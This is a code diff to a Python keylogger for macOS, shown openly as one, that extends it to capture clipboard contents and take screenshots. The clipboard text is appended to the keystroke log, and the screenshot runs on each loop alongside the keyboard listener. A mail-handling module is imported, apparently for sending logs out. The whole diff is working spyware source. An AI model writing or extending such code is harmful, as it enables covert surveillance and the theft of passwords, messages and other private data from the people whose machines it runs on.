@@ -2,11 +2,14 @@ import os
 from pynput import keyboard
 from datetime import datetime
 import json
-import mail_handler as md
 from threading import Timer
 import argparse
-import db_handle as dh
+from PIL import ImageGrab
+from AppKit import NSPasteboard, NSStringPboardType
+from multiprocessing import Process, freeze_support
 
+import mail_handler as md
+import db_handle as dh
 
 parser = argparse.ArgumentParser()
 parser.add_argument('--keylog', help='run keylogger.', action="store_true")
@@ -19,6 +22,7 @@ log_file = path + '/.log'
 
 send = True
 newTimer = False
+prev_clipboard = ''
 
 
 def log_to_db():
@@ -40,10 +44,20 @@ def log_to_db():
         params = (res[0][0], info["msg"], info["time"])
         dh.SQLupdate(query, params)
 
+
 def is_send():
     global send
     send = True
 
+
+def take_screen():
+    img = ImageGrab.grab()
+    img.save("screen.png")
+
+
+def get_img():
+    freeze_support()
+    Process(target=take_screen).start()
 
 """
 Class that processes some basic functions of a keylogger.
@@ -57,9 +71,16 @@ class Keylogger:
     get keyboard event.
     """
     def get_key(self, key):
+        global prev_clipboard
         try:
+            pb = NSPasteboard.generalPasteboard()
+            pbstring = pb.stringForType_(NSStringPboardType)
             getKey = str(key.char)
-            print(getKey)
+            if pbstring != prev_clipboard:
+                print("\nclipboard updated: " + pbstring)
+                prev_clipboard = pbstring
+                kl.append_log(' ' + pbstring + ' ')
+            # print(getKey)
         except AttributeError:
             getKey = ''
 
@@ -110,16 +131,19 @@ class Keylogger:
             keyboard_listener.join()
 
 
-if args.keylog:
-    kl = Keylogger()
-    while 1:
-        kl.start()
-        # if send is False and new timer is True, we set a new timer.
-        if not send and newTimer:
-            t = Timer(20.0, is_send)
-            t.start()
-            newTimer = False
-elif args.to_db:
-    log_to_db()
-else:
-    pass
+
+if __name__ == '__main__':
+    if args.keylog:
+        kl = Keylogger()
+        while 1:
+            kl.start()
+            get_img()
+            # if send is False and new timer is True, we set a new timer.
+            if not send and newTimer:
+                t = Timer(20.0, is_send)
+                t.start()
+                newTimer = False
+    elif args.to_db:
+        log_to_db()
+    else:
+        pass
